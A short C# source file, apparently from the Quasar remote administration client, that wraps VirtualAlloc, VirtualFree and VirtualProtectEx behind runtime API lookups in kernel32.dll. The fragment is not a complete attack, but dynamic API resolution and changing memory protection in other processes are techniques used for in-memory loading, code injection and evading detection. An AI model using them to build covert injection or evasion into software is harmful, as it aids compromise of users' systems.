using Quasar.Client.Win32PE.Structs;
using System;

namespace Quasar.Client.Utilities
{
    internal static partial class ClientNatives
    {

        internal delegate IntPtr VirtualAllocProc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        internal static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect)
            => Lookup<VirtualAllocProc>("kernel32.dll", "VirtualAlloc")(lpAddress, dwSize, flAllocationType, flProtect);

        internal delegate bool VirtualFreeProc(IntPtr lpAddress, uint dwSize, uint dwFreeType);
        internal static bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType)
            => Lookup<VirtualFreeProc>("kernel32.dll", "VirtualFree")(lpAddress, dwSize, dwFreeType);

        internal delegate bool VirtualProtectExProc(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            PageAccessRights flNewProtect,
            out PageAccessRights lpflOldProtect);
        internal static bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            PageAccessRights flNewProtect,
            out PageAccessRights lpflOldProtect)
            => Lookup<VirtualProtectExProc>("kernel32.dll", "VirtualProtectEx")(hProcess, lpAddress, dwSize, flNewProtect, out lpflOldProtect);
    }
}
